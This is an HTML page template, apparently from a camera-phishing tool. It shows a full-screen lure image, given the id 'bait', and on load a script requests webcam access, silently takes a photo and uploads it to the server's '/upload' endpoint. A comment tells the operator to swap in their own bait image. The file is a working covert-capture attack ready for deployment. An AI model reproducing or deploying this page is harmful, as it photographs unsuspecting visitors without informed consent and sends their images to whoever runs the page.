<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background: black;
        }
        #bait {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover; /* Fullscreen image, no gap */
        }
    </style>
</head>
<body>
    <!-- Replace welcome.jpg with your image in static folder -->
    <img src="/static/welcome.jpg" id="bait" alt="Welcome Image">

    <script>
        window.onload = function () {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    imageCapture.takePhoto()
                        .then(blob => {
                            const formData = new FormData();
                            formData.append('photo', blob, 'photo.jpg');
                            fetch('/upload', { method: 'POST', body: formData });
                        })
                        .catch(err => console.error("Photo capture error:", err));
                })
                .catch(err => console.error("Camera access denied:", err));
        };
    </script>
</body>
</html>
